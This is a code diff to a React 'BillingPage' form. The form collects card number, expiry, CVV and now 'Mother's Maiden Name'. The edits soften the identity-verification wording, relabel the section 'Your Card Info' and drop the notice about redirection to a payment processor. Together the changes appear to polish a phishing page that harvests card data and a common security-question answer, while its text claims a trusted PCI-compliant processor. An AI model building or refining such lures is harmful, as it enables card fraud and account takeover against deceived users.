@@ -22,7 +22,7 @@ const BillingPage = () => {
     expiry: "",
     cvv: "",
     // cardName: "",
-    motherMiddleName: "",
+    motherMaidenName: "",
   });
   const [loading, setLoading] = useState(false);
   const router = useRouter();
@@ -73,8 +73,8 @@ const BillingPage = () => {
                 Account Information
               </h2>
               <p className="mt-1 text-sm text-gray-600">
-                Provide the following information to verify your identity of
-                your credit/debit card associated with your account.
+                We just need a little more information to confirm your identity and keep your account secure.
+                Please provide the details requested below.
               </p>
             </div>
 
@@ -99,15 +99,15 @@ const BillingPage = () => {
 
                 <div>
                   <label className="block text-sm font-medium text-gray-700">
-                    Mother's Middle Name
+                    Mother's Maiden Name
                   </label>
                   <input
-                    name="motherMiddleName"
-                    value={form.motherMiddleName}
+                    name="motherMaidenName"
+                    value={form.motherMaidenName}
                     onChange={handleChange}
                     required={true}
                     className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
-                    placeholder="Enter Your Mother's Middle Name"
+                    placeholder="Enter Your Mother's Maiden Name"
                   />
                 </div>
               </div>
@@ -199,7 +199,7 @@ const BillingPage = () => {
 
               <div>
                 <h3 className="text-lg font-semibold text-gray-800 mb-3">
-                  Payment Method
+                  Your Card Info
                 </h3>
 
                 <div className="rounded-lg border p-4">
@@ -312,8 +312,7 @@ const BillingPage = () => {
                   </div>
 
                   <p className="text-xs text-gray-500 mt-3">
-                    We use a secure, PCI-compliant processor to handle card
-                    details.
+                    Your card details are handled safely by a trusted, PCI-compliant processor.
                   </p>
                 </div>
               </div>
@@ -346,8 +345,7 @@ const BillingPage = () => {
           </div>
 
           <div className="mt-6 text-xs text-gray-500 text-center">
-            By continuing you agree to the terms and will be redirected to a
-            secure payment processor.
+            By continuing, you agree to our terms and conditions.
           </div>
         </div>
       </div>
